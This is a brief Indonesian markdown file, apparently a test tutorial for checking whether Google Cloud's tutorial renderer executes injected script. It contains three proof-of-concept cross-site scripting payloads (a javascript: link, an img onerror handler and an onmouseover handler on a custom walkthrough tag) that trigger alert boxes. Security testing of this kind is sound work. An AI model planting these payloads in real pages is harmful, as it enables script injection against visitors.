# Test Tutorial XSS Google Cloud

Coba klik link ini:
<a href="javascript:alert(document.domain)">Klik Aku (A href)</a>

Atau lihat gambar ini:
<img src="x" onerror="alert('XSS Image')">

Tombol eksekusi Google (Custom tag Google):
<walkthrough-editor-spotlight spotlightId="console" text="Hover Me" onmouseover="alert('XSS Spotlight')"></walkthrough-editor-spotlight>
